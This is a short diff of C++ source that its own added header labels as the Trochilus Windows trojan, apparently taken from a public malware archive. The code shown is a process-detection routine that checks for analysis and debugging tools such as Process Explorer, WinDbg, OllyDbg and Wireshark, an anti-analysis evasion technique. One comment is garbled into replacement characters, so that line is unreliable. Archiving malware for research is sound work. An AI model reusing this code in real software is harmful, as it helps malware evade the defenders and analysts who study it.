@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include <Tlhelp32.h>
 #include "Exports.h"
@@ -15,7 +26,7 @@ ProcessDetector::~ProcessDetector()
 
 BOOL ProcessDetector::Start()
 {
-	//·À¼ì²â
+	//ï¿½ï¿½ï¿½ï¿½ï¿½
 	TCHAR* namestr = _T("procexp.exe,procmon.exe,windbg.exe,filemon.exe,ollyice.exe,ollydbg.exe,processspy.exe,spyxx.exe,cv.exe,wireshark.exe");
 	TStringVector namelist;
 	splitByChar(namestr, namelist, ',');
